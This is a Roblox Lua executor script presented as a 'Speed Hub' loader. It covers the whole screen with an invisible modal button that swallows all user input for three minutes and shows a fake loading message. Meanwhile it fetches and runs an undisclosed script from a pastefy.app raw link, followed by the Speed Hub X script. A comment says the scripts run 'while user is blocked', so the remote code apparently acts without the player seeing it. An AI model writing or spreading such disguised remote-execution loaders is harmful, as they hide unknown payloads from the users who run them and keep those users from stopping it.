--// Theme Colors
local bgColor = Color3.fromRGB(20, 20, 20)
local borderColor = Color3.fromRGB(255, 0, 0)
local textColor = Color3.fromRGB(255, 255, 255)

--// Create Framed Message Box
local function createFramedMessage(name, width, height, initialText)
    local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    gui.Name = name

    local border = Instance.new("Frame", gui)
    border.Size = UDim2.new(0, width + 8, 0, height + 8)
    border.Position = UDim2.new(0.5, -(width + 8)/2, 0.5, -(height + 8)/2)
    border.BackgroundColor3 = borderColor
    border.BorderSizePixel = 0

    local main = Instance.new("Frame", border)
    main.Size = UDim2.new(0, width, 0, height)
    main.Position = UDim2.new(0, 4, 0, 4)
    main.BackgroundColor3 = bgColor
    main.BorderSizePixel = 0

    local label = Instance.new("TextLabel", main)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = initialText
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 22
    label.TextColor3 = textColor
    label.TextWrapped = true

    return gui, label
end

--// Block User Input for X Seconds
local function blockUserInput(duration)
    local inputBlocker = Instance.new("ScreenGui", game:GetService("CoreGui"))
    inputBlocker.Name = "InputBlocker"
    inputBlocker.IgnoreGuiInset = true
    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local blockFrame = Instance.new("TextButton", inputBlocker)
    blockFrame.Size = UDim2.new(1, 0, 1, 0)
    blockFrame.Position = UDim2.new(0, 0, 0, 0)
    blockFrame.BackgroundTransparency = 1
    blockFrame.Text = ""
    blockFrame.AutoButtonColor = false
    blockFrame.Modal = true -- capture all input

    task.delay(duration, function()
        inputBlocker:Destroy()
    end)
end

--// Begin
blockUserInput(180) -- 3 minutes

local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Speed Hub Loading...")
task.wait(1)
label.Text = "Executing scripts..."

--// Immediately run your scripts while user is blocked
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/IZm17Kpn/raw"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
